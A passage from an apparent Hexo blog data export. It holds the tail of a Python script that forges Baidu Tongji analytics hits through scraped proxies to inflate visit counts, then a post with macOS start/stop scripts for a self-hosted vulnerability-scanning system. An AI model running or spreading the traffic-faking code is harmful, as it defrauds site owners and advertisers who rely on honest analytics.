class=\"string\">'v'</span>:<span class=\"string\">'1.2.16'</span>,</div><div class=\"line\">                        <span class=\"string\">'lv'</span>:<span class=\"string\">'3'</span>,</div><div class=\"line\">                        <span class=\"string\">'sn'</span>:str(int(time.time())%<span class=\"number\">65535</span>),</div><div class=\"line\">                        <span class=\"string\">'ct'</span>:<span class=\"string\">'!!'</span>,</div><div class=\"line\">                        <span class=\"string\">'tt'</span>:self.pageTitle</div><div class=\"line\">                &#125;</div><div class=\"line\">                <span class=\"keyword\">if</span> self.sourceUrl <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">                    params[<span class=\"string\">'su'</span>]=self.sourceUrl</div><div class=\"line\">                <span class=\"comment\"># 第一次提交数据</span></div><div class=\"line\">                r=s.get(<span class=\"string\">\"http://hm.baidu.com/hm.gif\"</span>,headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">5</span>)</div><div class=\"line\">                logging.info(r.url)</div><div class=\"line\">                time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\">                <span class=\"comment\"># 直接访问2 | 站外跳入2</span></div><div class=\"line\">                params[<span class=\"string\">'et'</span>]=<span class=\"string\">'87'</span></div><div class=\"line\">                params[<span class=\"string\">'rnd'</span>]=str(random.randint(<span class=\"number\">0</span>,<span class=\"number\">2147483647</span>))</div><div class=\"line\">                params.pop(<span class=\"string\">'sn'</span>)    <span class=\"comment\"># 移除 sn</span></div><div class=\"line\">                params.pop(<span class=\"string\">'ct'</span>)    <span class=\"comment\"># 移除 ct</span></div><div class=\"line\">                params.pop(<span class=\"string\">'tt'</span>)    <span class=\"comment\"># 移除 tt</span></div><div class=\"line\">                ep=&#123;</div><div class=\"line\">                    <span class=\"string\">'netAll'</span>:random.randint(<span class=\"number\">5</span>,<span class=\"number\">500</span>),</div><div class=\"line\">                    <span class=\"string\">'netDns'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'netTcp'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'srv'</span>:random.randint(<span class=\"number\">5</span>,<span class=\"number\">200</span>),</div><div class=\"line\">                    <span class=\"string\">'dom'</span>:random.randint(<span class=\"number\">250</span>,<span class=\"number\">750</span>),</div><div class=\"line\">                    <span class=\"string\">'loadEvent'</span>:random.randint(<span class=\"number\">800</span>,<span class=\"number\">1500</span>),</div><div class=\"line\">                    <span class=\"string\">'qid'</span>:<span class=\"string\">\"\"</span>,</div><div class=\"line\">                    <span class=\"string\">'bdDom'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'bdRun'</span>:<span class=\"number\">0</span>,</div><div class=\"line\">                    <span class=\"string\">'bdDef'</span>:<span class=\"number\">0</span></div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                ep= <span class=\"string\">'&#123;\"netAll\":'</span>+ str(random.randint(<span class=\"number\">5</span>,<span class=\"number\">500</span>)) + <span class=\"string\">',\"netDns\":0'</span> + <span class=\"string\">',\"netTcp\":0'</span> + <span class=\"string\">',\"srv\":'</span> + str(random.randint(<span class=\"number\">5</span>,<span class=\"number\">200</span>)) +   <span class=\"string\">',\"dom\":'</span> + str(random.randint(<span class=\"number\">250</span>,<span class=\"number\">750</span>))+<span class=\"string\">',\"loadEvent\":'</span> + str(random.randint(<span class=\"number\">800</span>,<span class=\"number\">1500</span>))+<span class=\"string\">',\"qid\":\"\",\"bdDom\":0,\"bdRun\":0,\"bdDef\":0&#125;'</span></div><div class=\"line\"></div><div class=\"line\">                params[<span class=\"string\">'ep'</span>]=str(ep)     <span class=\"comment\"># 顺序变乱，尚不清楚是否影响使用</span></div><div class=\"line\">                <span class=\"comment\"># 第二次提交数据</span></div><div class=\"line\">                r=s.get(<span class=\"string\">\"http://hm.baidu.com/hm.gif\"</span>,headers=headers,params=params,proxies=&#123;protocol:proxy&#125;,verify=<span class=\"keyword\">False</span>,timeout=<span class=\"number\">5</span>)</div><div class=\"line\">                logging.info(r.url)</div><div class=\"line\">                self.threadLock.acquire()</div><div class=\"line\">                self.counter = self.counter + <span class=\"number\">1</span></div><div class=\"line\">                print(<span class=\"string\">\"\\rSuccess %d times\"</span>%self.counter)</div><div class=\"line\">                self.threadLock.release()</div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"comment\">#print(\"Failed! Do again...\")</span></div><div class=\"line\">                print(<span class=\"string\">\".\"</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            <span class=\"keyword\">finally</span>:</div><div class=\"line\">                <span class=\"keyword\">pass</span>     </div><div class=\"line\"></div><div class=\"line\">            time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        <span class=\"comment\">#prog=\"BingoBF\",</span></div><div class=\"line\">        usage=<span class=\"string\">\"%(prog)s [options] \"</span>,</div><div class=\"line\">        description=<span class=\"string\">'刷百度统计访问数据'</span>,</div><div class=\"line\">        epilog=<span class=\"string\">\"+---+\\n\"</span></div><div class=\"line\">        )</div><div class=\"line\">    parser = argparse.ArgumentParser()</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-u\"</span>,dest=<span class=\"string\">\"url\"</span>,action=<span class=\"string\">\"store\"</span>,required=<span class=\"keyword\">True</span>,help=<span class=\"string\">\"目标URL，HM_ID从网页中提取\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"--proxyList\"</span>,dest=<span class=\"string\">\"proxyList\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"keyword\">None</span>,help=<span class=\"string\">\"代理地址列表文件，格式： http://127.0.0.1:8080 ; 如空，则自动从xicidaili.com/nn上爬取。\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-s\"</span>,dest=<span class=\"string\">\"source\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"keyword\">None</span>,help=<span class=\"string\">\"流量来源地址\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-c\"</span>,dest=<span class=\"string\">\"count\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"number\">10</span>, type=int , help=<span class=\"string\">\"访问次数 (目前只实现单一网页,单次访问统计),默认10次\"</span>)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"-t\"</span>,dest=<span class=\"string\">\"threads\"</span>,action=<span class=\"string\">\"store\"</span>,default=<span class=\"number\">1</span>,type=int,help=<span class=\"string\">\"线程数，默认为1\"</span>)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\"></div><div class=\"line\">    proxy_obj=Proxyer(args.proxyList)   <span class=\"comment\"># 生成一个Proxyer对象</span></div><div class=\"line\">    cheater_obj = Cheater(proxy_obj,args.url,args.source,args.threads,args.count)   <span class=\"comment\"># 生成一个Cheater对象</span></div><div class=\"line\"></div><div class=\"line\">    cheater_obj.run_Threads()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>"},{"title":"雷达巡航扫描系统--mac启动/终止脚本","date":"2017-08-03T02:56:13.000Z","_content":"主要涉及到使用[osascript](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/osascript.1.html)提权功能。\n\n另外,打算使用 trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL来自动结束脚本所启动的后台服务，然后将启动脚本写入automantor中。\n\n但最后并没有使用，因为有些问题不太清楚，比如：在automator中结束时到底具体捕获哪一个信号？\n\n暂且这样使用，后续有需求，再处理。\n\ntrap捕获信号 [http://man.linuxde.net/trap](http://man.linuxde.net/trap)\nPS: bash下可用，zsh下疑似有问题。\n<!-- more -->\n### 启动脚本\n```bash\n#!/bin/sh\ncd /Users/jason/geekTools/radar\nif [ $? -eq 0 ]\nthen\n    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\n    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\n\tosascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\n    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\n    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\n    echo \"Radar Started\";\n    say \"Radar Started\";\n    #trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\n    #bash kill.sh;\n    # while true; do \n    #     sleep 86400;\n    # done\nfi\n```\n### 终止脚本\n```bash\n#!/bin/sh\nps aux | grep 'mongod --port 65521 --dbpath DBData --auth' | grep -v 'grep'| awk -F ' ' '{print $2}' | xargs kill;\nps aux | grep 'Run.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\n#osascript -e 'do shell script \"ps aux | grep \\\"aider/Aider.py\\\" | grep -v \\\"grep\\\" | awk \\\"{print $2}\\\" | xargs sudo -s kill\" with administrator privileges'\nkillAider=\"ps aux | grep 'aider/Aider.py' | grep -v 'grep' | awk '{print \\$2}' | xargs sudo -s kill\";\nkillAider='do shell script \"'$killAider'\" with administrator privileges';\nosascript -e \"$killAider\";\n#trap \"osascript -e \\\"$killAider\\\"\" EXIT INT TERM QUIT KILL;\nps aux | grep 'nascan/NAScan.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\nps aux | grep 'vulscan/VulScan.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\necho \"Radar Terminated\";\nsay \"Radar Terminated\";\nexit\n```\n\n### 问题记录\n需要kill -9 xxx 才能结束某些进程。\n```bash\n➜  radar git:(master) ✗ ps aux | grep 'mongod --port 65521 --dbpath DBData --auth'\njason            17784   0.0  0.0  2452848   2004   ??  S    10:39AM   0:00.02 /bin/bash -c #!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\\012    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\\012    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -\njason            18686   0.0  0.0  2433828   1924 s001  R+   10:47AM   0:00.00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn mongod --port 65521 --dbpath DBData --auth\njason            18370   0.0  0.0  2435440   2240   ??  S    10:44AM   0:00.01 /bin/bash -c #!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\\012    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\\012    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -\n```\n","source":"_posts/雷达巡航扫描系统-mac启动-终止脚本.md","raw":"---\ntitle: 雷达巡航扫描系统--mac启动/终止脚本\ndate: 2017-08-03 10:56:13\ntags:\n---\n主要涉及到使用[osascript](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/osascript.1.html)提权功能。\n\n另外,打算使用 trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL来自动结束脚本所启动的后台服务，然后将启动脚本写入automantor中。\n\n但最后并没有使用，因为有些问题不太清楚，比如：在automator中结束时到底具体捕获哪一个信号？\n\n暂且这样使用，后续有需求，再处理。\n\ntrap捕获信号 [http://man.linuxde.net/trap](http://man.linuxde.net/trap)\nPS: bash下可用，zsh下疑似有问题。\n<!-- more -->\n### 启动脚本\n```bash\n#!/bin/sh\ncd /Users/jason/geekTools/radar\nif [ $? -eq 0 ]\nthen\n    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\n    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\n\tosascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\n    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\n    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\n    echo \"Radar Started\";\n    say \"Radar Started\";\n    #trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\n    #bash kill.sh;\n    # while true; do \n    #     sleep 86400;\n    # done\nfi\n```\n### 终止脚本\n```bash\n#!/bin/sh\nps aux | grep 'mongod --port 65521 --dbpath DBData --auth' | grep -v 'grep'| awk -F ' ' '{print $2}' | xargs kill;\nps aux | grep 'Run.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\n#osascript -e 'do shell script \"ps aux | grep \\\"aider/Aider.py\\\" | grep -v \\\"grep\\\" | awk \\\"{print $2}\\\" | xargs sudo -s kill\" with administrator privileges'\nkillAider=\"ps aux | grep 'aider/Aider.py' | grep -v 'grep' | awk '{print \\$2}' | xargs sudo -s kill\";\nkillAider='do shell script \"'$killAider'\" with administrator privileges';\nosascript -e \"$killAider\";\n#trap \"osascript -e \\\"$killAider\\\"\" EXIT INT TERM QUIT KILL;\nps aux | grep 'nascan/NAScan.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\nps aux | grep 'vulscan/VulScan.py' | grep -v 'grep' | awk '{print $2}' | xargs kill;\necho \"Radar Terminated\";\nsay \"Radar Terminated\";\nexit\n```\n\n### 问题记录\n需要kill -9 xxx 才能结束某些进程。\n```bash\n➜  radar git:(master) ✗ ps aux | grep 'mongod --port 65521 --dbpath DBData --auth'\njason            17784   0.0  0.0  2452848   2004   ??  S    10:39AM   0:00.02 /bin/bash -c #!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\\012    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\\012    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -\njason            18686   0.0  0.0  2433828   1924 s001  R+   10:47AM   0:00.00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn mongod --port 65521 --dbpath DBData --auth\njason            18370   0.0  0.0  2435440   2240   ??  S    10:44AM   0:00.01 /bin/bash -c #!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  >> log/db.log  2>&1 &\\012    /usr/local/bin/python Run.py >> log/web.log 2>&1 &\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py >> log/aider.log 2>&1 &\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py >> log/nascan.log 2>&1 &\\012    /usr/local/bin/python vulscan/VulScan.py >> log/vulscan.log 2>&1 &\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -\n```\n","slug":"雷达巡航扫描系统-mac启动-终止脚本","published":1,"updated":"2017-08-03T03:10:07.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjft4001097uvu79v6bdx","content":"<p>主要涉及到使用<a href=\"https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/osascript.1.html\" target=\"_blank\" rel=\"external\">osascript</a>提权功能。</p>\n<p>另外,打算使用 trap “bash kill.sh;exit” EXIT INT TERM QUIT KILL来自动结束脚本所启动的后台服务，然后将启动脚本写入automantor中。</p>\n<p>但最后并没有使用，因为有些问题不太清楚，比如：在automator中结束时到底具体捕获哪一个信号？</p>\n<p>暂且这样使用，后续有需求，再处理。</p>\n<p>trap捕获信号 <a href=\"http://man.linuxde.net/trap\" target=\"_blank\" rel=\"external\">http://man.linuxde.net/trap</a><br>PS: bash下可用，zsh下疑似有问题。<br><a id=\"more\"></a></p>\n<h3 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/jason/geekTools/radar</div><div class=\"line\"><span class=\"keyword\">if</span> [ $? <span class=\"_\">-eq</span> 0 ]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; <span class=\"built_in\">log</span>/db.log  2&gt;&amp;1 &amp;</div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python Run.py &gt;&gt; <span class=\"built_in\">log</span>/web.log 2&gt;&amp;1 &amp;</div><div class=\"line\">\tosascript <span class=\"_\">-e</span> <span class=\"string\">'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'</span></div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python nascan/NAScan.py &gt;&gt; <span class=\"built_in\">log</span>/nascan.log 2&gt;&amp;1 &amp;</div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python vulscan/VulScan.py &gt;&gt; <span class=\"built_in\">log</span>/vulscan.log 2&gt;&amp;1 &amp;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Radar Started\"</span>;</div><div class=\"line\">    say <span class=\"string\">\"Radar Started\"</span>;</div><div class=\"line\">    <span class=\"comment\">#trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL</span></div><div class=\"line\">    <span class=\"comment\">#bash kill.sh;</span></div><div class=\"line\">    <span class=\"comment\"># while true; do </span></div><div class=\"line\">    <span class=\"comment\">#     sleep 86400;</span></div><div class=\"line\">    <span class=\"comment\"># done</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div></pre></td></tr></table></figure>\n<h3 id=\"终止脚本\"><a href=\"#终止脚本\" class=\"headerlink\" title=\"终止脚本\"></a>终止脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\">ps aux | grep <span class=\"string\">'mongod --port 65521 --dbpath DBData --auth'</span> | grep -v <span class=\"string\">'grep'</span>| awk -F <span class=\"string\">' '</span> <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\">ps aux | grep <span class=\"string\">'Run.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\"><span class=\"comment\">#osascript -e 'do shell script \"ps aux | grep \\\"aider/Aider.py\\\" | grep -v \\\"grep\\\" | awk \\\"&#123;print $2&#125;\\\" | xargs sudo -s kill\" with administrator privileges'</span></div><div class=\"line\"><span class=\"built_in\">kill</span>Aider=<span class=\"string\">\"ps aux | grep 'aider/Aider.py' | grep -v 'grep' | awk '&#123;print \\$2&#125;' | xargs sudo -s kill\"</span>;</div><div class=\"line\"><span class=\"built_in\">kill</span>Aider=<span class=\"string\">'do shell script \"'</span><span class=\"variable\">$killAider</span><span class=\"string\">'\" with administrator privileges'</span>;</div><div class=\"line\">osascript <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$killAider</span>\"</span>;</div><div class=\"line\"><span class=\"comment\">#trap \"osascript -e \\\"$killAider\\\"\" EXIT INT TERM QUIT KILL;</span></div><div class=\"line\">ps aux | grep <span class=\"string\">'nascan/NAScan.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\">ps aux | grep <span class=\"string\">'vulscan/VulScan.py'</span> | grep -v <span class=\"string\">'grep'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> | xargs <span class=\"built_in\">kill</span>;</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Radar Terminated\"</span>;</div><div class=\"line\">say <span class=\"string\">\"Radar Terminated\"</span>;</div><div class=\"line\"><span class=\"built_in\">exit</span></div></pre></td></tr></table></figure>\n<h3 id=\"问题记录\"><a href=\"#问题记录\" class=\"headerlink\" title=\"问题记录\"></a>问题记录</h3><p>需要kill -9 xxx 才能结束某些进程。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  radar git:(master) ✗ ps aux | grep <span class=\"string\">'mongod --port 65521 --dbpath DBData --auth'</span></div><div class=\"line\">jason            17784   0.0  0.0  2452848   2004   ??  S    10:39AM   0:00.02 /bin/bash -c <span class=\"comment\">#!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; log/db.log  2&gt;&amp;1 &amp;\\012    /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\\012    /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -</span></div><div class=\"line\">jason            18686   0.0  0.0  2433828   1924 s001  R+   10:47AM   0:00.00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn mongod --port 65521 --dbpath DBData --auth</div><div class=\"line\">jason            18370   0.0  0.0  2435440   2240   ??  S    10:44AM   0:00.01 /bin/bash -c <span class=\"comment\">#!/bin/sh\\012cd /Users/jason/geekTools/radar\\012if [ $? -eq 0 ]\\012then\\012    /usr/local/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; log/db.log  2&gt;&amp;1 &amp;\\012    /usr/local/bin/python Run.py &gt;&gt; log/web.log 2&gt;&amp;1 &amp;\\012\\011osascript -e 'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'\\012    /usr/local/bin/python nascan/NAScan.py &gt;&gt; log/nascan.log 2&gt;&amp;1 &amp;\\012    /usr/local/bin/python vulscan/VulScan.py &gt;&gt; log/vulscan.log 2&gt;&amp;1 &amp;\\012    echo \"Radar Started\";\\012    say \"Radar Started\";\\012    trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL\\012    while true; do \\012        sleep 86400;\\012    done\\012fi\\012 -</span></div></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<p>主要涉及到使用<a href=\"https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/osascript.1.html\">osascript</a>提权功能。</p>\n<p>另外,打算使用 trap “bash kill.sh;exit” EXIT INT TERM QUIT KILL来自动结束脚本所启动的后台服务，然后将启动脚本写入automantor中。</p>\n<p>但最后并没有使用，因为有些问题不太清楚，比如：在automator中结束时到底具体捕获哪一个信号？</p>\n<p>暂且这样使用，后续有需求，再处理。</p>\n<p>trap捕获信号 <a href=\"http://man.linuxde.net/trap\">http://man.linuxde.net/trap</a><br>PS: bash下可用，zsh下疑似有问题。<br></p>","more":"<p></p>\n<h3 id=\"启动脚本\"><a href=\"#启动脚本\" class=\"headerlink\" title=\"启动脚本\"></a>启动脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\"><span class=\"built_in\">cd</span> /Users/jason/geekTools/radar</div><div class=\"line\"><span class=\"keyword\">if</span> [ $? <span class=\"_\">-eq</span> 0 ]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/mongod --port 65521 --dbpath DBData --auth  &gt;&gt; <span class=\"built_in\">log</span>/db.log  2&gt;&amp;1 &amp;</div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python Run.py &gt;&gt; <span class=\"built_in\">log</span>/web.log 2&gt;&amp;1 &amp;</div><div class=\"line\">\tosascript <span class=\"_\">-e</span> <span class=\"string\">'do shell script \"sudo -s /usr/local/bin/python aider/Aider.py &gt;&gt; log/aider.log 2&gt;&amp;1 &amp;\" with administrator privileges'</span></div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python nascan/NAScan.py &gt;&gt; <span class=\"built_in\">log</span>/nascan.log 2&gt;&amp;1 &amp;</div><div class=\"line\">    /usr/<span class=\"built_in\">local</span>/bin/python vulscan/VulScan.py &gt;&gt; <span class=\"built_in\">log</span>/vulscan.log 2&gt;&amp;1 &amp;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Radar Started\"</span>;</div><div class=\"line\">    say <span class=\"string\">\"Radar Started\"</span>;</div><div class=\"line\">    <span class=\"comment\">#trap \"bash kill.sh;exit\" EXIT INT TERM QUIT KILL</span></div><div class=\"line\">    <span class=\"comment\">#bash kill.sh;</span></div><div class=\"line\">    <span class=\"comment\"># while true; do </span></div><div class=\"line\">    <span class=\"comment\">#     sleep 86400;</span></div><div class=\"line\">    <span class=\"comment\"># done</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div></pre></td></tr></table></figure>\n<h3 id=\"终止脚本\"><a href=\"#终止脚本\" class=\"headerlink\" title=\"终止脚本\"></a>终止脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/sh</span></div><div class=\"line\">ps aux | grep <span class=\"string\">'mongod --port 65521 --dbpath DBData --auth'</span> | grep -v <span 